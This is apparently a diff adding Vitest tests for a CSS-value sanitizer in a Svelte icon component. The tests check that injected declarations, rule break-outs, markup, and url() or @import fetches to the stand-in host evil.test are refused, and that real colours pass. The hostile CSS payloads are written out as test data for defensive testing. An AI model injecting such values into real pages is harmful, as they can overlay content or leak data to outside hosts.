@@ -2,7 +2,7 @@ import { describe, it, expect, vi, afterEach } from 'vitest';
 import { render } from '@testing-library/svelte';
 import Icon from '../Icon.svelte';
 import shieldIcon from '$lib/assets/icons/shield.svg?raw';
-import { singleSvgMarkup } from '$lib/utils/sanitize';
+import { singleSvgMarkup, safeCSSValue } from '$lib/utils/sanitize';
 import { htmlHazards } from '$lib/utils/__tests__/html-hazards';
 
 // Icon.svelte renders its `src` prop with `{@html}`. The reason that was ever safe
@@ -99,5 +99,54 @@ describe('Icon', () => {
         const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
         render(Icon, { src: shieldIcon });
         expect(warn).not.toHaveBeenCalled();
+    });
+});
+
+describe('safeCSSValue', () => {
+    it.each([
+        ['a second declaration', 'red;position:fixed;inset:0'],
+        ['a fetch in a colour’s clothes', 'var(--x);background:url(https://evil.test/?d=1)'],
+        ['a stylesheet import', '@import url(https://evil.test/x.css)'],
+        ['a rule break-out', 'red}body{display:none'],
+        ['markup', 'red<b>bold</b>'],
+    ])('refuses %s', (_name, value) => {
+        expect(safeCSSValue(value, 'currentColor')).toBe('currentColor');
+    });
+
+    // What the call sites actually pass: refusing one of these would quietly repaint every icon.
+    it.each([
+        'currentColor',
+        '#eab308',
+        'var(--color-accent,#00add8)',
+        'var(--color-status-red)',
+        'rgba(0, 0, 0, .5)',
+    ])('accepts %s', (value) => {
+        expect(safeCSSValue(value, 'currentColor')).toBe(value);
+    });
+});
+
+describe('Icon style attribute', () => {
+    afterEach(() => vi.restoreAllMocks());
+
+    it('renders a refused colour as the fallback, not as declarations', () => {
+        const { container } = render(Icon, { src: shieldIcon, color: 'red;position:fixed;inset:0' });
+        const style = container.querySelector('span.icon')?.getAttribute('style') ?? '';
+        expect(style).toContain('--icon-color: currentColor');
+        expect(style).not.toContain('position');
+        expect(style).not.toContain('inset');
+    });
+
+    it('renders a real colour', () => {
+        const { container } = render(Icon, { src: shieldIcon, color: 'var(--color-status-red)' });
+        expect(container.querySelector('span.icon')?.getAttribute('style'))
+            .toContain('--icon-color: var(--color-status-red)');
+    });
+
+    it('keeps a size that is not a number out of the attribute', () => {
+        // `width` is typed `number`; a style attribute is where breaking that turns into CSS.
+        const { container } = render(Icon, { src: shieldIcon, width: '0;position:fixed' as unknown as number });
+        const style = container.querySelector('span.icon')?.getAttribute('style') ?? '';
+        expect(style).toContain('--icon-width: 16px');
+        expect(style).not.toContain('position');
     });
 });
